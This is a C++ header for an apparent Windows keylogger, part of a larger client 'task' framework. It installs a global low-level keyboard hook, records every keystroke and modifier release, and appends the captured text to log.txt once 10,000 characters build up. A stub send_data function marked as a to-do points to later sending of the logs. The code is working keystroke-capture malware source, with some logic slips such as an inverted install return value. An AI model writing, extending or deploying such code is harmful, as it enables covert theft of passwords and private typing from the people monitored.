#pragma once
#ifndef KEYHOOK_H
#define KEYHOOK_H

#include <iostream>
#include "Windows.h"
#include <task\client_tasks\keylogger\key_constrants.h>
#include <fstream>
#include <mutex>
#include <chrono>
#include <functional>
#include <condition_variable>

#define MAX_SIZE_KEYLOG 10000
#define FILE_NAME "log.txt"

namespace keyhook {

	bool UninstallHook();

	std::string keylog{};
	HHOOK eHook = nullptr;

	struct file_manager {
		std::ofstream file_key;

		std::string data;
		std::string file_name = FILE_NAME;

		bool running;

		std::mutex mtx;

		file_manager()
		{}

		void write_data(std::string keylog)
		{
			std::lock_guard<std::mutex> lock(mtx);
			data = keylog;
			write_file();
		}

		void write_file()
		{
			if (!file_key.is_open())
				open_file();
			file_key << data;
			data.clear();
			close_file();
		}

		void open_file()
		{
			file_key.open(file_name, std::ofstream::out | std::ofstream::app);
		}

		void send_data()
		{
			//send
			// TODO waiting writing in file
			if (data.size() > 0)
				std::this_thread::sleep_for(
					std::chrono::milliseconds(2000)
				);

			running = false;
			data = "";
		}
		void close_file()
		{
			file_key.close();
		}

		std::string get_file_name()
		{
			return FILE_NAME;
		}

		static file_manager* get()
		{
			static file_manager* singleton = nullptr;
			if (!singleton)
				singleton = new file_manager();
			return singleton;
		}
	};

	void insert_data()
	{
		file_manager::get()->write_data(keylog);
		keylog.clear();
	}


	LRESULT keyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
	{
		if (nCode < 0)
			CallNextHookEx(eHook, nCode, wparam, lparam);
		KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;
		if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
		{
			keylog += Keys::KEYS[kbs->vkCode].Name;
			if (kbs->vkCode == VK_RETURN)
				keylog += '\n';

		}
		else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
		{
			DWORD key = kbs->vkCode;
			if (key == VK_CONTROL
				|| key == VK_LCONTROL
				|| key == VK_RCONTROL
				|| key == VK_SHIFT
				|| key == VK_LSHIFT
				|| key == VK_RSHIFT
				|| key == VK_MENU
				|| key == VK_LMENU
				|| key == VK_RMENU
				|| key == VK_CAPITAL
				|| key == VK_NUMLOCK
				|| key == VK_LWIN
				|| key == VK_RWIN)
			{
				std::string keyName = Keys::KEYS[kbs->vkCode].Name;
				keyName.insert(1, "/");
				keylog += keyName;
			}
		}
		
		if (keylog.size() > MAX_SIZE_KEYLOG)
		{
			insert_data();
		}

		return CallNextHookEx(eHook, nCode, wparam, lparam);
	}

	bool InstallHook()
	{
		eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)keyboardProc, GetModuleHandle(NULL), 0);
		return eHook == NULL;
	}

	bool UninstallHook()
	{
		BOOL b = UnhookWindowsHookEx(eHook);
		eHook = NULL;
		return (bool)b;
	}

	bool isHooked()
	{
		return (bool)(eHook == NULL);
	}

}
#endif // KEYHOOK_H
